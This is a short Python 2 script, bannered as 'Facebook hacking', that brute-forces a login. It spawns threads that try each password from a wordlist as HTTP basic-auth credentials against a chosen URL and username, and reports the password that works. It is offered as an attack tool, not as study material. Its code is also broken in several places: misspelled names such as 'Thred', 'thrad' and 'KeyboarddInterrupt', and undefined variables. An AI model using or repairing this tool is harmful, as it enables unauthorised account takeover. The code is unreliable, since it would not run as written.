#!/usr/bin/python

import requests
from  threading import Thread
import sys
import getopt

global hit
hit = "1"

def banner():
	print "##########################"
	print "MY BASIC FACEBOOK HACKING"
	print "#########################"

def usage():
	print "usage:"
	print "		-w: url"
	print "		-u: username "
	print "		-t: threads "
	print "		-f: password list"

class request_performer(Thread):
	def __init__(self,name,user,url):
		Thred.__init__(self)
		self.password = name.split("\n")[0]
		self.username = user
		self.url = url
		print "_" + self.password + "_"

	def run(self):
		global hit
		if hit == "1":
			try:
				r = requests.get(self.url, auth=(self.username, self.password))
				if r.status_code == 200:
					hit = "0"
					print "[+] PASSWORD FOUND -" + self.password
					sys.exit()
				else:
					print "[+] - " + self.password + " - INCORRECT PASSWORD!"
					i[0] = i[0]-1
			except Exception, e:
				print e

def start(argv):
	banner()
	if len(sys.argv) < 5:
		usage()
	try:
		opts, args = getopt.getopt(argv, "u:w:f:t:")
	except getopt.GetoptError:
		print "Error on arguments"
		sys.exit()

	for opt,arg in opts:
		if opt == '-u':
			user = arg
		elif opt == '-w':
			url = arg
		elif opt == '-f':
			dictio = arg
		elif opt == '-t':
			threads = arg
	try:
		f = open(dictio,"r")
		password = f.readlines()
	except:
		print "[!!] Cant Open That File"
		sys.exit()
	launcher_thread(password,threads,user,url)

def launcher_thread(passwords,th,username,url):
	global i
	i = []
	i.append(0)
	while len(password):
		if hit == "1":
			try:
				if i[0] < th:
					passwd = passwords.pop(0)
					i[0] = i[0] +1
					thread = request_performer(passwd, username, url)
					thrad.start()
			except KeyboarddInterrupt:
				print "[!!]Interrupted"
				sys.exit()
				threads.join()

if __name__ == "__main__":
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt:
		print "[!!]Interrupted"


